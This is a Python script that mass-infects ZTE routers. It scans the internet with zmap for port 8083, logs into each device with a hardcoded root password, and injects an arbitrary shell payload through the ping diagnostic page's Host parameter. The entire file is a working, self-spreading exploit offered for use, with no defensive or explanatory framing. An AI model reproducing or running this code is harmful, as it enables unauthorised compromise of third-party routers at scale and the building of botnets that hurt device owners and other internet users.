import requests, threading, os, time

class Infect_ZTE(threading.Thread):
    def __init__(self, payload: str, ip: str):
        threading.Thread.__init__(self)
        self.addr = f'http://{ip}:8083'
        self.payload = payload
        self.send = 0

    def run(self):
        payloads= [
            ('/login.gch', 'Frm_Logintoken=4&Username=root&Password=W%21n0%26oO7.'),
            ('/manager_dev_ping_t.gch', f'&Host=;$({self.payload})&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit'),
        ]

        try:
            for payload in payloads:
                requests.post(f'{self.addr}/{payload[0]}', timeout= 5, data= payload[1])
                self.send += 1

            requests.get(f'{self.addr}/getpage.gch?pid=1001&logout=1', timeout= 5)
        except:
            pass
        
        print(f'[{self.addr}] payload sent: {self.send}/{len(payloads)}')

def run(payload: str):
    threading.Thread(target=os.system, args=('sudo zmap -p 8083 -o zte_vuln.txt --bandwidth=10M',)).start()

    blacklist= []
    with open('./zte_vuln.txt', 'r+') as zte_file:
        while True:
            time.sleep(1)
            for device in zte_file:
                device = device.split('\n')[0]

                if device not in blacklist:
                    blacklist.append(device)
                    Infect_ZTE(payload, device).start()